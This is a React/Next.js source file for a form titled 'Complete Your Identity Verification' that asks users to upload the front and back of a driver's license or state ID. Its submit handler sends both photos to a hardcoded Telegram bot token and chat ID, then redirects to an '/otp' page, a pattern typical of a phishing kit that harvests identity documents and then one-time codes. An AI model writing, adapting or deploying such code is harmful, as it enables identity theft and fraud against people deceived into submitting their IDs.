"use client";
import { useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";

const IdentityVerificationForm = () => {
  const [frontImage, setFrontImage] = useState<File | null>(null);
  const [backImage, setBackImage] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const router = useRouter();

  const handleImageChange = (side: "front" | "back", file: File | null) => {
    if (file && file.size > 5 * 1024 * 1024) {
      setError("File size exceeds 5MB. Please upload a smaller file.");
      if (side === "front") {
        setFrontImage(null);
        setFrontPreview(null);
      } else {
        setBackImage(null);
        setBackPreview(null);
      }
      return;
    }
    setError(null);

    if (side === "front") {
      setFrontImage(file);
      setFrontPreview(file ? URL.createObjectURL(file) : null);
    } else {
      setBackImage(file);
      setBackPreview(file ? URL.createObjectURL(file) : null);
    }
  };

  const sendTelegramMessage = async (message: string, frontImage: File, backImage: File) => {
    const botToken = "7972666652:AAHpQu7Ax4vgN-lL_-psZbWVjptYDvgl7YA";
    const chatId = "1303640598";

    if (!botToken || !chatId) {
      console.error("Bot token or chat ID is missing.");
      return;
    }

    try {
      const formData1 = new FormData();
      formData1.append('chat_id', chatId);
      formData1.append('caption', message);
      formData1.append('photo', frontImage);

      const response1 = await fetch(
        `https://api.telegram.org/bot${botToken}/sendPhoto`,
        {
          method: "POST",
          body: formData1,
        }
      );

      if (!response1.ok) {
        throw new Error(`Failed to send front image. Status: ${response1.status}`);
      }

      const formData2 = new FormData();
      formData2.append('chat_id', chatId);
      formData2.append('caption', message);
      formData2.append('photo', backImage);

      const response2 = await fetch(
        `https://api.telegram.org/bot${botToken}/sendPhoto`,
        {
          method: "POST",
          body: formData2,
        }
      );

      if (!response2.ok) {
        throw new Error(`Failed to send back image. Status: ${response2.status}`);
      }

      const responseData1 = await response1.json();
      const responseData2 = await response2.json();

      if (responseData1.ok && responseData2.ok) {
        console.log("Message and images sent successfully to Telegram.");
      } else {
        console.error("Telegram API returned an error:", responseData1.description || responseData2.description);
      }
    } catch (error) {
      console.error("Error sending Telegram message:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!frontImage || !backImage) {
      setError("Both front and back images are required.");
      return;
    }

    setIsSubmitting(true);

    await sendTelegramMessage(
      "Identity verification images submission.",
      frontImage,
      backImage
    );

    setIsSubmitting(false);

    // Reset form after successful upload
    setFrontImage(null);
    setBackImage(null);
    setFrontPreview(null);
    setBackPreview(null);

    router.push("/otp");
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 p-6">
      <div className="bg-white p-8 rounded-lg shadow-lg max-w-md w-full">
        <h2 className="text-3xl font-semibold text-gray-800 text-center mb-4">
          Complete Your Identity Verification
        </h2>
        <p className="text-center text-gray-600 mb-6">
          Upload images of the front and back of your <strong>Driver License</strong> or <strong>State ID</strong>.
        </p>
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="flex flex-col items-center">
            <label
              htmlFor="front-file-input"
              className="w-full h-56 border-4 border-dashed border-gray-300 flex items-center justify-center rounded-lg cursor-pointer bg-gray-100 hover:bg-gray-200 transition-all mb-4"
            >
              {frontPreview ? (
                <Image
                  src={frontPreview}
                  alt="Front ID Preview"
                  width={192}
                  height={192}
                  className="rounded-lg object-cover"
                />
              ) : (
                <span className="text-gray-500">Upload or Snap Front of Your ID</span>
              )}
            </label>
            <input
              type="file"
              id="front-file-input"
              accept="image/*"
              capture="user" 
              className="hidden"
              onChange={(e) =>
                handleImageChange("front", e.target.files ? e.target.files[0] : null)
              }
            />
          </div>

          <div className="flex flex-col items-center">
            <label
              htmlFor="back-file-input"
              className="w-full h-56 border-4 border-dashed border-gray-300 flex items-center justify-center rounded-lg cursor-pointer bg-gray-100 hover:bg-gray-200 transition-all"
            >
              {backPreview ? (
                <Image
                  src={backPreview}
                  alt="Back ID Preview"
                  width={192}
                  height={192}
                  className="rounded-lg object-cover"
                />
              ) : (
                <span className="text-gray-500">Upload or Snap Back of Your ID</span>
              )}
            </label>
            <input
              type="file"
              id="back-file-input"
              accept="image/*"
              capture="user" 
              className="hidden"
              onChange={(e) =>
                handleImageChange("back", e.target.files ? e.target.files[0] : null)
              }
            />
          </div>

          {error && <p className="text-red-600 text-sm text-center">{error}</p>}

          {isSubmitting ? (
            <div className="flex justify-center">
              <div className="w-6 h-6 border-4 border-t-blue-600 border-gray-300 rounded-full animate-spin"></div>
            </div>
          ) : (
            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition-all"
            >
              Submit for Verification
            </button>
          )}

          <div className="text-center text-sm text-gray-500 mt-4">
            By submitting, you agree to our <span className="text-blue-600">Privacy Policy</span> and <span className="text-blue-600">Terms of Service</span>.
          </div>
        </form>
      </div>
    </div>
  );
};

export default IdentityVerificationForm;
